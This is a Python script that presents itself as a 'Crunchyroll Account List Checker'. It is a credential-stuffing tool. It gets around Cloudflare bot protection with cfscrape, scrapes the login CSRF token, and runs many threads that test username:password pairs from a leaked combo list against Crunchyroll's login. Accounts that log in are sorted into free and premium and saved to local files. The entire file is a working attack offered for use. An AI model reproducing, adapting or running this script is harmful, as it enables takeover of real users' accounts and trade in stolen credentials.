#Copyright 2017 Joao Vitor B. F.

#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.

#I would also love if you kept a credit on my name when you modify or redistribute this script <3

from bs4 import BeautifulSoup
import requests
import argparse
import os
import sys
import threading
import time
import cfscrape

tLock = threading.Lock()

def cls():
    os.system('cls' if os.name=='nt' else 'clear')
	
def check(name, threadid):
	while True:
		try:
			print(name+" thread is loading the Cloudflare bypass.")
			sess = cfscrape.create_scraper()
			loginpage=sess.get("https://www.crunchyroll.com/login")	
			phpsess=loginpage.cookies["PHPSESSID"]
			loginsoup = BeautifulSoup(loginpage.text, "html.parser")
			csrftok = loginsoup.find(id="login_form__token")["value"]
			headerz={"Host":"www.crunchyroll.com",
			"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
			"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language":"en-US,en;q=0.5",
			"Accept-Encoding":"gzip, deflate, br",
			"Referer":"https://www.crunchyroll.com/login?next=%2F",
			"Upgrade-Insecure-Requests":"1"}
			print(name+" loaded the Cloudflare bypass. Starting thread.")

			global total
			total = sum(1 for line in open(arg.inputfile))
		except:
			continue
		break

	for line in combo:
		while True:
			try:
				if total!=0:
					global percentage
					global checked
					percentage = (checked/total)*100
				if checked >= total:
					exit()
				user, passw = line.split(":")
				user=user.strip()
				passw=passw.strip()
				
				sess.post("https://www.crunchyroll.com/login", data={"login_form[name]":user, "login_form[password]":passw, "login_form[redirect_url]":"/", "login_form[_token]":csrftok}, headers=headerz, cookies={"PHPSESSID":phpsess})
				testacc = sess.get("https://www.crunchyroll.com/acct/membership", headers=headerz, cookies={"PHPSESSID":phpsess, "c_locale":"enUS"})
				testsoup = BeautifulSoup(testacc.text, "html.parser")
				
				if testsoup.title.string.strip() == "Crunchyroll -   Account Management":
					global working
					working = working + 1
					try:
						if testsoup.find(class_="acct-membership-status").contents[1].contents[3].string.strip() == "Free":
							global free
							free = free + 1
							tLock.acquire()
							with open("justworking.txt", "a") as justworking:
								justworking.write(user+":"+passw+"\n")
								justworking.close
							tLock.release()
					except:
						global premium
						premium = premium + 1
						tLock.acquire()
						with open("workingandpremium.txt", "a") as workingandpremium:
							workingandpremium.write(user+":"+passw+"\n")
							workingandpremium.close
						tLock.release()
				checked = checked + 1
			except:
				continue
			break
		
if __name__=="__main__":

	class arg:
		pass
	argparser = argparse.ArgumentParser(description="Crunchyroll Account List Checker made by JoaoVitorBF.", usage="%(prog)s input_file", epilog="Version: 1.0")
	argparser.add_argument("inputfile", metavar="input_file", help="inputs a combo list text file to be used.")
	argparser.add_argument("threads", metavar="number_of_threads", help="specifies the number of threads to use (recommended max of 20).")
	argus = argparser.parse_args(namespace=arg)
	if os.path.isfile(arg.inputfile):
		print("File found, starting checker...")
	else:
		print("File \""+arg.inputfile+"\" does not exist. Please input an existing combo list text file.")
		exit()
	thread = []
	global combo
	combo = open(arg.inputfile, "r")
	global percentage, checked, free, premium, working, total
	percentage, checked, free, premium, working, total = 0, 0, 0, 0, 0, 99999999

	for i in range(int(arg.threads)):
		threadz = threading.Thread(target=check, args=("Thread "+str(i+1), i+1))
		thread.append(threadz)
		thread[i].start()
	while True:
		if checked >= total:
			print("Checking finished, "+str(working)+" working accounts, which "+str(premium)+" are premium.")
			print("Accounts saved to text files.")
			exit()
		cls()
		print("CrunchyrollChecker 1.2 by JoaoVitorBF\nTotal: "+str(total)+" | Checked: "+str(checked)+" | Working: "+str(working)+" | Free: "+str(free)+" | Premium: "+str(premium)+" | Completed: "+str(percentage)+"%")
		time.sleep(3)
		
#Thank you for using my script!